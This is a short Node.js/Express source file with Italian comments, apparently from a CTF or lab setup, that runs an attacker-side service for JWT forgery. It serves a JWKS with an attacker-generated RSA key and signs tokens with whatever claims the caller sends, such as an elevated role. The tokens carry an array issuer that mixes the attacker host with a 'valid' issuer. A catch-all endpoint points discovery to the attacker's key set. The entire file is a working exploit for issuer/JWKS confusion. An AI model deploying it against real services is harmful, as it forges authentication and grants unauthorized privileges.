// attacker/server.js  – JWKS e generatore di token
import express              from 'express';
import { generateKeyPairSync } from 'crypto';
import pem2jwk              from 'pem2jwk';
import jwt                  from 'jsonwebtoken';

const PORT = process.env.PORT || 3001;
/* schema incluso ⇒ il backend non deve “indovinare” http://        */
const HOST = `http://attacker:${PORT}`;
const KID  = 'atk-kid';

/* Chiavi RSA runtime (4096 bit) ---------------------------------- */
const { privateKey, publicKey } = generateKeyPairSync('rsa', {
  modulusLength     : 4096,
  publicKeyEncoding : { type: 'pkcs1', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
});
const JWK = { ...pem2jwk(publicKey), kid: KID, alg: 'RS256', use: 'sig' };

/* Express --------------------------------------------------------- */
const app = express();
app.use(express.json());

/* 1 ─ JWKS pubblico */
app.get('/.well-known/jwks.json', (_req, res) => res.json({ keys: [JWK] }));

/* 2 ─ Token malevolo con role=1 */
app.post('/create-token', (req, res) => {
  const token = jwt.sign(
    { ...req.body, iss: [HOST, 'https://valid-iss'] },
    privateKey,
    { algorithm: 'RS256', keyid: KID, expiresIn: '1h' },
  );
  res.type('text/plain').send(token);
});

/* 3 ─ Endpoint “di cortesia” per discovery */
app.all('*', (_req, res) => res.json({
  issuer   : HOST,
  jwks_uri : `${HOST}/.well-known/jwks.json`,
}));

app.listen(PORT, () => {
  console.log(`[attacker] JWKS & token service up on ${HOST} (kid=${KID})`);
});
